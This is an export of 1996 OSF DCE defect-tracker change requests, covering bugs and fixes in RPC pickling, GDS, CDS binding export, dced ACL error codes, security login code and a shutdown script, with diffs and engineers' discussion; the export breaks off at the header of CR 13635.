    original        notReady        1996/10/09 1996/10/09 piers           25076          

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    1996/09/23 11:26:14  open            piers (Hendrie, Piers *VENDOR*)
    1996/09/24 09:59:16  assign          cwang (Cathy Wang)
    1996/09/24 16:32:26  note            piers (Hendrie, Piers *VENDOR*)
    1996/10/09 11:47:58  accept          cwang (Cathy Wang)
    1996/10/21 14:00:28  modify          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by piers (Hendrie, Piers *VENDOR*), 1996/09/23 11:26:14, action: open>
Pickeling:  Major and Minor versions mixed in pickling.c.

Comparing versions in pickling.c line 1045, the vers_major
is assumed to be in the high 16 bits of the interface version.
Looking at the idl interpreter parser code with Cathy, we can 
see that it is the vers_minor that is stored in the high 16
bits, and the vers_major is stored in the low 16 bits.

So, link 1046 and 1047 should simply have the words 'major'
and 'minor' swapped.

Problem found while writing test case for dce_server_inq_server().

    <Note by cwang (Cathy Wang), 1996/09/24 09:59:16, action: assign>
This defect may be a dup of defect 13162 which we returned because not reproducable.
Old Owner: ainswrth
New Owner: cwang



    <Note by piers (Hendrie, Piers *VENDOR*), 1996/09/24 16:32:25, action: note>
Similarly, the 'major' and 'minor' need to be swapped in function
idl_es_put_encoding_header() in pickling.c at lines 848 and 868.

    <Note by cwang (Cathy Wang), 1996/10/21 14:00:28, action: modify>
The defect is fixed, here is the diffs in src/rpc/idl/lib/pickling.c:

879c879
<     vers_field = p_if_spec->vers % 65536;   /* Major version */
---
>     vers_field = p_if_spec->vers / 65536;   /* Major version */
881c881
<     vers_field = p_if_spec->vers / 65536;   /* Minor version */
---
>     vers_field = p_if_spec->vers % 65536;   /* Minor version */
901,902d900
<                                                      = p_if_spec->vers % 65536;
<     p_es_state->IDL_pickle_header.IDL_if_id.vers_minor
903a902,903
>     p_es_state->IDL_pickle_header.IDL_if_id.vers_minor
>                                                      = p_if_spec->vers % 65536;
1077,1079c1077,1079
<             if (p_if_spec->vers !=
<                 (p_es_state->IDL_pickle_header.IDL_if_id.vers_minor * 65536
<                         + p_es_state->IDL_pickle_header.IDL_if_id.vers_major))
---
>             if (p_if_spec->vers 
>                 != (p_es_state->IDL_pickle_header.IDL_if_id.vers_major * 65536
>                         + p_es_state->IDL_pickle_header.IDL_if_id.vers_minor))

However we have decided instead of dropping the fix for IBM, we will
open an OT defect.  The reason is that by fixing it, it will cause
the incompatibility problem to back level releases.



CR Number                     : 13658
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13647
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dced
Subcomponent Name             : dced_hostdata_create
Short Description             : dced_hostdata_create test expects wrong status.
Reported Date                 : 10/18/96
Found in Baseline             : 1.2.2
Found Date                    : 10/17/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : private

[01/01/93 public]
[Bart Fenerty 10/19/96 private]



CR Number                     : 13657
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : 
Short Description             : DIT restricted to strict tree
Reported Date                 : 10/18/96
Found in Baseline             : 1.2.1
Found Date                    : 10/18/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/18/96 public]

The GDS uses a table (the SRT) to represent restrictions on the structure
of valid X.500 names (part of the schema).  Each entry in this table
specifies the constraints on a particular RDN within a name, and also 
specifies the entry that describes the immediate superior RDN (i.e. the RDN
to the left of the current RDN).

Since the constraint entry for each RDN is restricted to having only
a single superior RDN, this table can only describe a strict tree-structure
of names within the DIT.

The X.500 spec allows for non-tree-structured naming rules.  For
example, X.521 (Selected Object Classes) describes name-forms
like "/C=US/O=DEC/OU=A/OU=B/OU=C/OU=.../CN=Fred".  The repeating
"/OU=..." portion of this name can't be represented by a tree, and
cannot therefore be represented in GDS's schema.

The only workaround we've come up with is to create additional SRT
entries, one for each level of "/OU=..." that we need to add.  This
is not a viable general solution.

[10/18/96 public]
I only remember the '88 version of the spec, which is what GDS
conforms too.  In that spec DIB was used to refer to the Directory
Information Base.  This was the total of all info.  A possible shape
it could take was a tree, and the term DIT was used to refer to it,
Directory Information Tree.  See X.500 (that's part 1) section 6.2:

   The entries of the DIB are arranged in the form of a tree, the
   Directory Information Tree (DIT) where the vertices represent the
   entries.  Entries higher in the tree (nearer the root) will often
   represent objects such as countries or organizations, while entries
   lower in the tree will represent people or application processes.

   Note - The services defined in this Recommendation operate only on a
   tree-structured DIT.  This Recommendation does not preclude the
   existence in the future of other structures (as the need arises).

Also, I can find no such example in X.521, can you give a more
specific reference?  I didn't think this changed in the '92 version
but could be wrong on this.

I recommend cancelling this defect or at least changing it to an
enhancement.



CR Number                     : 13656
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : tcl
Short Description             : libtcl.a contains procedure named 'main'
Reported Date                 : 10/17/96
Found in Baseline             : 1.2.2
Found Date                    : 10/17/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/17/96 public]

When building libtcl.a the file tclMain.o is included in the process. 
The file tclMain.o contains the procedure main() in it. Therefore the 
libtcl.a contains the procedure main whereas it should not. This is a 
loader dependent problem and does not cause a build error on the reference 
machine.



CR Number                     : 13655
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gdsditadm
Short Description             : The CDS-Cell screen restricts cell name length
Reported Date                 : 10/8/96
Found in Baseline             : 1.2.2
Found Date                    : 10/8/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/8/96 public]

Mask 21, CDS-Cell screen for entering cell information, has a field of
36 characters for "Root dir name". If you have a cell with a gds name
longer than 36 characters, it wraps around and overwrites "Namespace
UUID" field.
.

 +----------------------------------------------------------------------------+
 |  (Mask 21)          DIRECTORY SYSTEM                 Add Object            |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |                                                                            |
 |     CDS-Cell                                                               |
 |                                                                            |
 |                                                                            |
 |       Namespace UUID: 007C6B54-58AD-1C2F-A096-000082690138                 |
 |                                                                            |
 |                                                                            |
 |       Root dir UUID:  007C6B54-58AD-1C2F-A096-000082690138                 |
 |                                                                            |
 |                                                                            |
 |       Root dir name:  /.../c=us/o=osf/ou=osfsun/__________                 |
 |                                                                            |
 |                                                                            |
 |                                                                            |
 |                                                                            |
 |                                                                            |
 |                                                                            |
 +----------------------------------------------------------------------------+



CR Number                     : 13653
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gda
Short Description             : gda can only use default session to read X.500
Reported Date                 : 10/8/96
Found in Baseline             : 1.2.2
Found Date                    : 10/8/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/8/96 public]

When a foreign cell has an X.500 name, gdad needs to contact X.500 
to read the foreign cell information. gdad uses XDS/XOM calls to
contact its local X.500 client/dua, but the call ds_bind() uses
DS_DEFAULT_SESSION, which means that it only binds to the default
session which has to be directory 1 with a default DSA configured.

When configuring an X.500 client, one can choose to use other 
directories, and not to configure any default DSA (to bind, you then
have to specify a directory id and dsa name), which is common.

The documentation should be updated to reflect this restriction. This
should be spelled out in section 22.3.2 (Defining a Cell in the Global 
Directory Service) for the Admin Guide, and Section 3.2 (Defining a Cell
in the Directory) for the GDS Admin Guide.

To remove the restriction, gdad may want to take a configuration file
which allows the administrator to specify which directory id and dsa
name should be used to contact the X.500.



CR Number                     : 13650
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000,hppa
S/W Ref Platform              : aix, hpux
Component Name                : cds
Subcomponent Name             : library
Short Description             : only one binding gets exported to entry in namespace
Reported Date                 : 10/4/96
Found in Baseline             : 1.2.2
Found Date                    : 10/4/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : library/cds_rpcserver.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/4/96 public]

The following mail is from Grant Alvis
====================================================================

A customer opened a problem report due to an inconsistency that they
observed in the way the following CDS namespace entries were created:

/.:/hosts/<hostname>/cds-server
/.:/hosts/<hostname>/cds-clerk

It seems that when you configure your DCE cell, only one binding (TCP/IP)
gets exported to the entry.  However, the endpoint map contains full
mappings for both the UDP/IP and TCP/IP bindings.

I looked into the src/directory/cds/library/cds_rpcserver.c file, at the
routine cds_export_replace().  It turns out that it has some funky logic
in it that it will *purposely* truncate a binding vector by setting the
count to 1.  It then exports only the first binding in the vector.  After
it has exported the binding, it then sets the binding vector length back
to its original length!!

There are no comments in the code as to why it might do this, and this
is not a protocol specific modification.  It has no knowledge of which
binding is in the first element of the binding vector.

As a matter of fact, I looked at an HP cell, and it does the same thing,
only all of its entries have only UDP bindings!

Any ideas as to why this is the way it is?  I changed the code so that
it would export all protocols, and everything works fine.  It sure would
be nice to know why this is coded the way it is, since it looks like
somebody made a conscious effort to make sure that only one binding
got exported.

Thanks,
Grant

Grant Alvis
IBM DCE Customer Support
(512) 838-4144

====================================================================

Back to me (Roger).  I was a little surprised that this was still the
case since I thought something like this would have been caught awhile
ago.  Anyway, this is the case with R1.2.2 on AIX, so I'm filing this
OT.  This isn't the case with our version on alpha, so here are the
diffs for directory/cds/library/cds_rpcserver.c.  Because of a temporary
lack of AIX machine resources at the moment, I haven't verified these
changes on AIX yet, but plan to when the machine is free.

798c799,800
< 				ex->object_uuid, rpc_c_binding_max_count_default, 
---
> 				ex->object_uuid, 
> 				rpc_c_binding_max_count_default, 
800,801c802,819
<    if (status != rpc_s_ok) {
<       goto MIN_CLEANUP;
---
>    if (status == rpc_s_ok) {
>        /*
> 	* Read all the bindings until we either find the bindings or we 
> 	* find there's none
> 	*/
>        do {
> 	   rpc_ns_binding_lookup_next (lookup_context, &current_binding_vector, &status );
>        } while ((status != rpc_s_ok && status != rpc_s_no_more_bindings && 
> 		 status != rpc_s_entry_not_found) &&
> 		dthread_delay(15.0) >= 0);
> 
>        /*
> 	* Destroy lookup context
> 	*/
>        rpc_ns_binding_lookup_done (&lookup_context, &temp_status);
>        if (temp_status != rpc_s_ok) {
> 	   goto CLEANUP;
>        }
803,811d820
<    
<    /*
<     * Keep looking until we either find the bindings or we find there's none
<     */
<    do {
<       rpc_ns_binding_lookup_next (lookup_context, &current_binding_vector, &status );
<    } while ((status != rpc_s_ok && status != rpc_s_no_more_bindings) &&
<       dthread_delay(15.0) >= 0);
<    
817,823c826,832
<       /*
<        * Binding lookup succeeded.  We should only have had one binding
<        * in the ns to lookup, but we'll manage if there's more.  If we find any that
<        * don't match the "new" binding vector, then we unexport them all and
<        * export the good stuff.
<        */
<       current_binding_count = current_binding_vector->count;
---
>        /*
> 	* Binding lookup succeeded.  We should only have had one binding
> 	* in the ns to lookup, but we'll manage if there's more.  If we find any that
> 	* don't match the "new" binding vector, then we unexport them all and
> 	* export the good stuff.
> 	*/
>        current_binding_count = current_binding_vector->count;
825c834
< 
---
>    
834a844,848
>       /*
>        * Clear endpoints and object uuids out of the current binding
>        * then convert it to a string binding for comparison to
>        * the new ones
>        */
837d850
< 	 rpc_string_free( &current_string_binding, &status );
840a854,857
>       rpc_binding_set_object( current_binding_vector->binding_h[i], NULL, &status);
>       if (status != rpc_s_ok) {
> 	 goto CLEANUP;
>       }
852a870
> 
858,859c876,877
< 	 
< 	 rpc_binding_to_string_binding (ex->new_binding_vector->binding_h[j],
---
> 
>          rpc_binding_to_string_binding (ex->new_binding_vector->binding_h[j],
866c884
< 	    
---
> 
874c892,893
<       }
---
> 
>       } /* End loop thru new bindings */
882,888c901,907
< 	 rpc_ns_binding_unexport (name_syntax, ex->entry_name, ex->if_spec, 
< 				     NULL, &status);
< 	 if (status != rpc_s_ok) {
< 	    goto CLEANUP;
< 	 }
<       } /* new bindings */
<    } /* current bindings */
---
> 	  rpc_ns_binding_unexport (name_syntax, ex->entry_name, ex->if_spec, 
> 				   NULL, &status);
> 	  if (status != rpc_s_ok) {
> 	      goto CLEANUP;
> 	  }
>       } 
>    } /* End loop thru new bindings */
897,908d915
<       rpc_binding_reset (ex->new_binding_vector->binding_h[0], &status);
<       if (status != rpc_s_ok) {
< 	 goto CLEANUP;
<       }
<       rpc_binding_to_string_binding (ex->new_binding_vector->binding_h[0],
< 				     &new_string_binding,
< 				     &status);
<       if (status != rpc_s_ok) {
< 	 rpc_string_free( &current_string_binding, &status );
< 	 goto CLEANUP;
<       }
< 	 
912,914d918
<       new_binding_count = ex->new_binding_vector->count;
<       ex->new_binding_vector->count = 1;
< 
919,920d922
<       ex->new_binding_vector->count = new_binding_count;
< 
934c936
<    DCE_SVC_DEBUG((cds__svc_handle, cds_svc_general, svc_c_debug2,
---
>    DCE_SVC_DEBUG((cds__svc_handle, cds_svc_general, svc_c_debug6,
941,948d942
<    /*
<     * Destroy lookup context
<     */
<    rpc_ns_binding_lookup_done (&lookup_context, &status);
<    if (status != rpc_s_ok) {
<       goto CLEANUP;
<    }
<



CR Number                     : 13649
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : dce_svc__lock_for_write
doesn't check fcntl status
Reported Date                 : 10/3/96
Found in Baseline             : 1.1, 1.2.2
Found Date                    : 10/3/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/3/96 public]

dce_svc__lock_for_write() is used to take a write lock on message
routing files that were previously opened with shared R/W@ access.
It calls fcntl() to set the lock.

However, fcntl() is non-blocking, and may return with status indicating
that the lock could not be set.  This status is not checked.

[10/03/96 public]
I thought fcntl would only return something like EWOULDBLOCK if you
used the non-blocking version of the param.  Is this a threads bug?



CR Number                     : 13648
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login API
Short Description             : Need means of changing expired passwd
Reported Date                 : 10/03/96
Found in Baseline             : 1.1
Found Date                    : 10/03/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/4/96 public]
"What we really need here is an API call to change an expired password, passing
in the old password and new one, and that could return an error if the old
password was incorrect.  This API should not require you to have credentials
to do the password change, because you can't get credentials with an expired
password.  This type of call is really necessary to make integrated login
programs work in the face of password expiration policy (now enforced as of
DCE1.1)."

[10/4/96 public]
BTW, I forgot to mention that this should not be implemented without an
accompanying policy switch that lets the administrator disable the changing
of expired passwords without an identity (since some administrators are
too paranoid to allow that to happen without their intervention).

BTW, the Fixby 1.2 above is only because OT is being extremely annoying and
not accepting anything else for the Fixby field.  For an enhancement
(especially after 1.2 is frozen), this is ridiculous.



CR Number                     : 13647
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : dced acls
Short Description             : dced acl code returns wrong error on unauthz
Reported Date                 : 10/2/96
Found in Baseline             : 1.1
Found Date                    : 10/2/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : admin/dced/libdcedpvt/acls.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/2/96 public]

dced authorization check code in acls.c returns the wrong error
(sec_acl_invalid_permission) all over the place, when some operation
is not authorization to occur, where it should be returning
sec_acl_not_authorized:

(see the following explanations from sec.sams)
start
code    sec_acl_invalid_permission
text    "permission not valid for this acl"
explanation    "One or more specified permissions not valid for this ACL."
action         "Determine correct permissions and retry the operation."
end

start
code    sec_acl_not_authorized
text    "operation on acl not authorized"
explanation    "Not authorized to perform the requested operation on this
		object."
action         "Identity with control rights to ACL should perform the
		operation."
end

I would consider this a showstopper (these error codes are passed over the
wire and thus become part of the protocol) which *must* be fixed for 1.2.2
and must be patched for all previous releases.



CR Number                     : 13646
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : DCE ACL library
Short Description             : DCE ACL library can't support owning USER/GROUP
Reported Date                 : 10/2/96
Found in Baseline             : 1.1
Found Date                    : 10/2/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dce/utils/acldb/aclimpl.c,dce/utils/misc/lib.sams, admin/dced/libdcedpvt/acls.c
Diff supplied by              : provider
Diff release                  : 1.2
Sensitivity                   : public

[10/2/96 public]

There's a bug open here that you can use dce_rdacl_replace() to set a
user_obj or group_obj entry on an ACL, but after that point, can never
update the ACL again (because evaluating an ACL with a user_obj or group_obj
entry requires the ACL manager providing the owner and group owner UUIDs,
and it looks like provisions for doing so were never accounted for when
the DCE ACL library was implemented (can't get them through the resolver
and none of the ACL DB code knows anything about them).

The short term fix is not to allow Apps to specify that owners or owning
groups (dce_acl_c_has_owner and/or dce_acl_c_has_groups, the latter of which
is really ambiguous and should probably be changed at some point).  We're
fixing it here by adding a new acl_s_ error: acl_s_owners_not_implemented
and having dce_acl_register_object_type() return this new error if either
of those flags is specified.  This will prevent apps from running into the
other problems encountered because the library can't support owners yet.
We'll supply the diffs here as soon as we have a fix tested.

I'll open another OT (enhancement) with Rich Salz's and my suggestions for
how to fix this (by providing new support) in a post 1.2.2 release.

[10/10/96 public]
Here are the diffs for the fix based on the HP DCE product release,
so they may not match line number for line number with the 1.2 release.

********************************
<<< file 1:
/vob/dce/src/dce/utils/acldb/aclimpl.c@@/main/HPDCE02/elley_CHFts19
775/0
>>> file 2: aclimpl.c
********************************
-----[after 108 inserted 109-119]-----
>
>     /* The DCE ACL library does not yet support user/group ownership of
>      * objects. If an ACL manager that supports user/group ownership
>      * attempts to register, an error is returned. This check can be
>      * removed after support for ownership is implemented.
>      */
>     if ((flags & dce_acl_c_has_owner) || (flags & dce_acl_c_has_groups)){
>       *st = acl_s_owners_not_implemented;
>       return;
>     }
>
-----[after 423 inserted 435]-----
>
********************************
<<< file 1:
/vob/dce/src/dce/utils/misc/lib.sams@@/main/HPDCE02/elley_CHFts1977
5/0
>>> file 2: lib.sams
********************************
-----[after 463 inserted 464-476]-----
>
> start
> code          acl_s_owners_not_implemented
> text          "User_obj and group_obj ACL entries are not supported yet"
> explanation   "In a dce_acl_register_object_type operation an attempt was
>                made to register an ACL manager that supports user/group
>                ownership while the DCE ACL library does not support this
>                ownership yet."
> action                "Modify code in the ACL manager until support for
owners
hip
>                is implemented."
> end
>
>
********************************
<<< file 1:
/vob/dce/src/admin/dced/libdcedpvt/acls.c@@/main/HPDCE02/elley_CHFt
s19775/0
>>> file 2: acls.c
********************************
-----[716 changed to 716]-----
<       dced_resolve_object, NULL, dce_acl_c_has_owner, st);
---
>       dced_resolve_object, NULL, 0, st);
-----[722 changed to 722]-----
<       dced_resolve_object, NULL, dce_acl_c_has_owner, st);
---
>       dced_resolve_object, NULL, 0, st);
-----[728 changed to 728]-----
<       dced_resolve_object, NULL, dce_acl_c_has_owner, st);
---
>       dced_resolve_object, NULL, 0, st);
-----[734 changed to 734]-----
<       dced_resolve_object, NULL, dce_acl_c_has_owner, st);
---
>       dced_resolve_object, NULL, 0, st);
-----[740 changed to 740]-----
<       dced_resolve_object, NULL, dce_acl_c_has_owner, st);
---
>       dced_resolve_object, NULL, 0, st);



CR Number                     : 13645
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : sec_login
Short Description             : sec_rgy_unix_getpw*() return incorrect results
Reported Date                 : 10/02/96
Found in Baseline             : 1.2.2
Found Date                    : 10/02/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]
    The code for testing override flags while creating a unix password
    entry was incorrect. The user visible effect of this error is:

        If more than one field in a passwd entry was overridden
        sec_rgy_unix_getpwnam() and sec_rgy_unix_getpwuid()
        would return incorrect results.


diffs for file security/client/rca/unix.c
- -----------------------------------------

10a11,13
>  * Revision /main/hinxman_override_flags/1  1996/10/02  14:11 UTC  hinxman
>  *    Handling of flags in rgy_override_entry
>  * 
493c496
<         if (*overridden == sec_override_pw_passwd) {
- ---
>         if (FLAG_SET(*overridden, sec_override_pw_passwd)) {
497c500
<         if (*overridden == sec_override_pw_gecos) {
- ---
>         if (FLAG_SET(*overridden, sec_override_pw_gecos)) {
507c510
<         if (*overridden == sec_override_pw_dir) {
- ---
>         if (FLAG_SET(*overridden, sec_override_pw_dir)) {
517c520
<         if (*overridden == sec_override_pw_shell) {
- ---
>         if (FLAG_SET(*overridden, sec_override_pw_shell)) {



CR Number                     : 13642
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : PK ERAs
Short Description             : Allow ERA aaclmgr permset be updated after creation.
Reported Date                 : 10/02/96
Found in Baseline             : 1.2.2
Found Date                    : 10/27/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]
[cuti]
By design, ERA aclmgr permset cannot be changed after creation.  However,
in public key world, there is a need to loosen up this restriction to allowcell admin to be able to change the permset of ERA on site



CR Number                     : 13641
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : PK pvtkey & dcecp
Short Description             : passphrase of bothkey usages' key pair should be the same
Reported Date                 : 09/27/96
Found in Baseline             : 1.2.2
Found Date                    : 09/27/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]
[cuti 960927]
If two passphrases entered by the cell admin are different during account 
creation or update, then no matter which passphrase the user eneters for 
dce_login, the login will fail.  The reason is dce_login only takes one 
password and we use both key usage's key pair for authentication, if these two

passphrase are different, one of key pairs' private key won't be able to be 
decrypted and public key operation won't succeed, therefore the login will fai
.

There are two fix involved:
1. Check the passphrases of the tow key usages key pair if they are entered in
the samle line in dcecp.
2. In private_key_store/update, if there is already private key existent, use
the new passphrase to test on the old private key, only if the private key can
be decrypted, the passphrase can be used to store the key, otherwise the 
passphrase (pwd in code) will be rejected



CR Number                     : 13640
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : PK login
Short Description             : International build doesn't work
Reported Date                 : 09/26/96
Found in Baseline             : 1.2.2
Found Date                    : 10/01/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]
Whereever there is a pkc referenced, set ".if defined(USE_DES)" and ".end" around.  Also define NOENCRYPTION for international build in rsdb_acct.o to avoid
undefined symbol, sec_pvtkey__register_pvtkey

I also fix one of dcecp assumption about default value of PK key modulus size.
Dcecp shouldn't assume the value, should just pass in 0 to psm call which will
turn 0 modulus size to default value.

LIST THE SOURCE FILES AFFECTED BY THE CHANGE:

./admin/dcecp/rgy.h
./libdce/Makefile
./libdce/RIOS/machdep.mk
./security/Makefile
./security/psm/international/sec_psm.c
./security/server/rsdb/Makefile
./security/server/rsdb/rsdb_acct.c



CR Number                     : 13639
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : PK preauth
Short Description             : dce_login of PK princ does not work
Reported Date                 : 10/01/96
Found in Baseline             : 1.2.2
Found Date                    : 10/01/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]

[10/01/96]
the following test scenario does not work properly:

    dcecp> account create pk_user1 -group none -organization none -mypwd $CELL
PW -password
 pk_passwd -pkmechanism file -pksignature { {gen 512} {newpassphrase pk_passwd

} -pkkeycipher { {gen 512} {newpassphrase pk_passwd} }

    mtet_echo "dce_login_tp1: add  pre_auth_req ERA 3 PADATA-ENC_PUBLIC_KEY to
p
rinc."
    dcecp> principal modify pk_user1 -add {pre_auth_req 3}

    dce_login pk_user1 $PWD -e kdestroy

produces:

Warning: Generating pksignature public key; this may take a few minutes.
Warning: Generating pkkeycipher public key; this may take a few minutes.

Sorry.
Password Validation Failure. - Preauthentication failed (dce / krb)



CR Number                     : 13638
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : secd crashes reading replay log
Reported Date                 : 09/25/96
Found in Baseline             : 1.2.2
Found Date                    : 09/25/96
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : private

[10/3/96 private]
We have reproduced the secd replay log crash that occured a few
months ago. It is now reproducible because we backed up the
security directory. secd is crashing with "registry object
not found" when replaying the log.



CR Number                     : 13636
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_shutdown
Short Description             : pkssd shutdown not logged and incorrect
Reported Date                 : 10/1/96
Found in Baseline             : 1.2.2
Found Date                    : 10/1/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/1/96 public]

When running dce_shutdown with no pkssd daemon running, the following
cruft is displayed to the terminal:
usage: kill [ -signo ] pid ...

This is because the shutdown command for pkssd is incorrect:

	#
	# Shutdown PKSSD
	#

	ps -ef | grep pkssd | grep -v grep | awk '{print $2}'\; | xargs kill

Not only does this attempt to kill a non-existent process, but
it also does not follow dce_config standards for logging actions.

Suggested fix:

1. Remove above lines
2. Modify:
if [ $llbd_running -eq 1 ]
then
	# dced is not being used by any NCS application
       	DAEMONS1="${PWD_MGMT} dtsd dtstimed dts_.* gdad auditd cdsadv cdsd secd $EPMAP"
else
	# dced is being used by NCS
	log_msg SUMMARY "Daemon dced is being used by NCS.  It will be restarted \
as rpcd."
	DAEMONS1="${PWD_MGMT} dtsd dtstimed dts_.* gdad auditd cdsadv cdsd secd $EPMAP"
	restart_rpcd=1
fi

To:
DAEMONS1="${PWD_MGMT} dtsd dtstimed dts_.* gdad auditd cdsadv cdsd secd $EPMAP pkssd"
if [ $llbd_running -ne 1 ]
then
	# dced is being used by NCS
	log_msg SUMMARY "Daemon dced is being used by NCS.  It will be restarted \
as rpcd."
	restart_rpcd=1
fi

pkssd will then be killed along with all other DCE daemons using functions
that correctly log the actions.



CR Number                     : 13635
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : DCE ACL lib
Short Description             : DCE ACL lib dce_rdacl_get_access Broken
